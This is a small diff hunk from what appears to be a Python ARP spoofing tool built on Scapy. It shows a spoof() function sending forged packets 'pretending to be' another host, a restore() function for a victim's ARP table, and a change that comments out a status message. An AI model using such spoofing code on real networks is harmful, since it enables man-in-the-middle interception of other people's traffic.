@@ -30,8 +30,8 @@ def spoof(target_ip, spoof_ip, target_mac, verbose=True):
     # send the packet and hide output
     sendp(packet, verbose=False) 
 
-    if verbose:
-        print(f"[+] Sent to {target_ip}: pretending to be {spoof_ip}")
+    # if verbose:
+    #     print(f"[+] Sent to {target_ip}: pretending to be {spoof_ip}")
 
 def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
     # Restore victim's ARP table
